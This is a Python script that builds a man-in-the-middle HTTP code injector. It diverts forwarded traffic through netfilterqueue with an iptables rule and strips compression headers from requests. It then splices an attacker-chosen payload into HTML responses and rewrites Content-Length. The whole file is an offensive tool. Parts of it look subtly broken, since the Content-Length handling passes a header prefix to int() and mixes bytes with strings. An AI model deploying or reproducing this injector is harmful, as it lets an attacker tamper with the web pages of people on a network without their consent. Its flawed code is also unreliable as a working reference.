import netfilterqueue
import scapy.all as scapy
import re
import subprocess


class Code_injector:
    def __init__(self, parameter, payload):
        self.parameter = parameter
        self.payload = payload
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, self.processed_packet)

    def set_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def processed_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                modified_packet = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load.decode('utf-8'))
                new_packet = self.set_load(scapy_packet, modified_packet)
                packet.set_payload(bytes(new_packet))
                #print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                modify_packet = scapy_packet[scapy.Raw].load.decode('utf-8').replace(self.parameter, self.payload)
                new_packet = self.set_load(scapy_packet,modify_packet)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", scapy_packet[scapy.Raw].load.decode('utf-8'))
                if content_length_search and "text/html" in scapy_packet[scapy.Raw].load.decode('utf-8'):
                    content_length = content_length_search.group(0)
                    new_content_length = int(content_length) + len(self.payload)
                    scapy_packet[scapy.Raw].load = scapy_packet[scapy.Raw].load.replace(content_length, str(new_content_length))
                    new_packet = self.set_load(scapy_packet, scapy_packet[scapy.Raw].load)
                    packet.set_payload(bytes(new_packet))
                packet.set_payload(bytes(new_packet))
                #print(scapy_packet.show())

        packet.accept()

    def run(self):
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
        self.queue.run()
        subprocess.call("iptables --flush", shell=True)
